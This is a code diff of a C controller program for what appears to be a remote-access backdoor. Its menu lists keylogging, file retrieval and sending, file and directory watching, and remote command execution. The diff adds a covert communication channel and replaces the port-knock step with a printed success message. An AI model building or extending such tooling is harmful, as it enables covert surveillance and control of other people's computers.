@@ -1,14 +1,18 @@
+#include "commands.h"
+#include "context.h"
 #include "network.h"
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <time.h>
 
 #define MAX_IP_LEN 16
 #define MAX_INPUT_LEN 128
 #define MAX_MENU 7
 
 enum menu {
+    DISCONNECT,
     UNINSTALL,
     START_KL,
     GET_FILE,
@@ -16,7 +20,6 @@ enum menu {
     WATCH_FILE,
     WATCH_DIR,
     REMOTE_RUN,
-    DISCONNECT
 };
 
 int print_menu(void){
@@ -57,13 +60,7 @@ long get_choice(char *choice){
     return ret;
 }
 
-void free_context(struct Context *ctx) {
-    if (ctx->runner_ip != NULL) {
-        free(ctx->runner_ip);
-    }
-}
-
-int main(int argc, char *argv[]){
+int main(void){
     int run = 1;
     char ip_buffer[MAX_IP_LEN] = "";
     char input_buffer[MAX_INPUT_LEN];
@@ -75,16 +72,28 @@ int main(int argc, char *argv[]){
         fprintf(stderr, "Error reading client IP. Try again.\n");
     }
 
-    ctx.runner_ip = calloc(0, MAX_IP_LEN);
     memcpy(ctx.runner_ip, ip_buffer, MAX_IP_LEN);
 
-    int ret = perform_knock(&ctx);
-    if (ret == -1) {
-        free_context(&ctx);
-        return -1;
-    }
+    printf("Performing knock sequence at %s\n", ctx.runner_ip);
+//    int ret = perform_knock(&ctx);
+//    if (ret != 0) {
+//        fprintf(stderr, "perform_knock error.\n");
+//        return -1;
+//    }
+    printf("Knock sequence successfully completed.\n");
 
     long choice;
+
+    // setting up context: create covert_fd, set seq_num = 0
+    ctx.covert_fd = setup_covert_fd();
+    if (ctx.covert_fd < 0) {
+        fprintf(stderr, "Error setting up covert fd\n");
+        return -1;
+    }
+    ctx.cmd_seq_num = 0;
+    ctx.rep_seq_num = 0;
+
+    srand((unsigned int)time(NULL));
 
     while(run){
         print_menu();
@@ -114,6 +123,7 @@ int main(int argc, char *argv[]){
                 break;
             case SEND_FILE:
                 printf("Send file\n");
+                cmd_send_file(&ctx);
                 break;
             case WATCH_FILE:
                 printf("Watching file...\n");
